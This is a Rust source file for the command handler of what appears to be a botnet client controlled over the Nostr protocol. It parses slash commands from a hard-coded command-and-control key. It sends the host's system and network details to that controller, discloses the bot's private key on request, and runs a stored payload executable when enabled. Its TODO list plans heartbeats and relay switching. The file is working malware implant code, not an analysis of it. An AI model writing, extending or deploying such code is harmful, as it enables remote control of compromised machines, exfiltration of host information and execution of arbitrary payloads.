use std::fmt;

use crate::bot::state::State;
use nostr_sdk::prelude::*;

pub enum Commands {
    HelloWorld(HelloWorldCommand),
    Disable(DisableCommand),
    Enable(EnabledCommand),
    PrivateKey(RequestPrivateKeyCommand),
    Help(HelpCommand),
    Sysinfo(SysInfoCommand),
    // TODO:
    // SwitchRelay
    // SwitchFileServer
    // Kill
    // HeartBeat : periodically send a health message to the CNC
    // SystemInformation
}

pub type CommandResult = Result<String>;

impl Commands {
    pub fn parse(command: &str) -> Option<Self> {
        let parts: Vec<&str> = command.split_whitespace().collect();
        if parts.is_empty() || parts[0].len() <= 1 || !parts[0].starts_with('/') {
            return None;
        }

        let command_str = &parts[0][1..];
        let _args = &parts[1..];
        match command_str {
            "hello" => Some(Commands::HelloWorld(HelloWorldCommand {})),
            "disable" => Some(Commands::Disable(DisableCommand {})),
            "enable" => Some(Commands::Enable(EnabledCommand {})),
            "private_key" => Some(Commands::PrivateKey(RequestPrivateKeyCommand {})),
            "help" => Some(Commands::Help(HelpCommand {})),
            "info" => Some(Commands::Sysinfo(SysInfoCommand {})),
            _ => None,
        }
    }

    pub async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
        match self {
            Commands::HelloWorld(cmd) => cmd.execute(state, session).await,
            Commands::Disable(cmd) => cmd.execute(state, session).await,
            Commands::Enable(cmd) => cmd.execute(state, session).await,
            Commands::PrivateKey(cmd) => cmd.execute(state, session).await,
            Commands::Help(cmd) => cmd.execute(state, session).await,
            Commands::Sysinfo(cmd) => cmd.execute(state, session).await,
        }
    }
}

use crate::{CNC_PUB_KEY, session::Session};

pub trait Command {
    fn execute(&self, state: &mut State, session: &Session) -> impl Future<Output = Result<()>>;
}

pub struct SysInfoCommand {}

impl Command for SysInfoCommand {
    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
        use sysinfo::{Networks, System};
        let mut sys = System::new_all();
        sys.refresh_all();

        let mut content = String::new();
        content.push_str(&format!("=> system:\n"));
        content.push_str(&format!("total memory: {} bytes\n", sys.total_memory()));
        content.push_str(&format!("used memory : {} bytes\n", sys.used_memory()));
        content.push_str(&format!("total swap  : {} bytes\n", sys.total_swap()));
        content.push_str(&format!("used swap   : {} bytes\n", sys.used_swap()));

        content.push_str(&format!("System name:             {:?}\n", System::name()));
        content.push_str(&format!(
            "System kernel version:   {:?}\n",
            System::kernel_version()
        ));
        content.push_str(&format!(
            "System OS version:       {:?}\n",
            System::os_version()
        ));
        content.push_str(&format!(
            "System host name:        {:?}\n",
            System::host_name()
        ));

        content.push_str(&format!("NB CPUs: {}\n", sys.cpus().len()));

        let networks = Networks::new_with_refreshed_list();
        content.push_str("=> networks:\n");
        for (interface_name, data) in &networks {
            content.push_str(&format!(
                "{interface_name}: {} B (down) / {} B (up)\n",
                data.total_received(),
                data.total_transmitted(),
            ));
        }

        session
            .send_msg(&content, PublicKey::parse(CNC_PUB_KEY).unwrap())
            .await?;

        Ok(())
    }
}

pub struct HelloWorldCommand {}

impl Command for HelloWorldCommand {
    async fn execute(&self, _state: &mut State, session: &Session) -> Result<()> {
        session
            .send_msg("Hello World!", PublicKey::parse(CNC_PUB_KEY).unwrap())
            .await?;
        Ok(())
    }
}

pub struct DisableCommand {}

impl Command for DisableCommand {
    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
        state.enabled = false;
        if let Some(ref mut child) = state.child {
            child.kill()?;
            state.child = None;
        }
        session.update_metadata(state.to_string().as_str()).await?;
        session
            .send_msg("I'm disabled", PublicKey::parse(CNC_PUB_KEY).unwrap())
            .await?;
        Ok(())
    }
}

pub struct EnabledCommand {}

impl Command for EnabledCommand {
    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
        state.enabled = true;
        if let Some(child) = &mut state.child {
            child.kill()?;
            state.child = None;
        }
        if let Some(ref path_buf) = state.payload {
            state.child = Some(session.run_executable(path_buf));
        }
        session.update_metadata(state.to_string().as_str()).await?;
        session
            .send_msg("I'm enabled", PublicKey::parse(CNC_PUB_KEY).unwrap())
            .await?;

        Ok(())
    }
}

pub struct RequestPrivateKeyCommand {}

impl Command for RequestPrivateKeyCommand {
    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
        let private_key = session.keys.secret_key().to_bech32()?;
        session
            .send_msg(
                &format!("This is my private key: {}", private_key),
                PublicKey::parse(CNC_PUB_KEY).unwrap(),
            )
            .await?;
        Ok(())
    }
}

pub struct HelpCommand {}

impl Command for HelpCommand {
    async fn execute(&self, _state: &mut State, session: &Session) -> Result<()> {
        session
            .send_msg(
                "Available commands:
                    /help : Display this help message
                    /hello : Say hello
                    /disable : Disable the bot
                    /enable : Enable the bot
                    /private_key : Request the private key of the bot
                ",
                PublicKey::parse(CNC_PUB_KEY).unwrap(),
            )
            .await?;
        Ok(())
    }
}
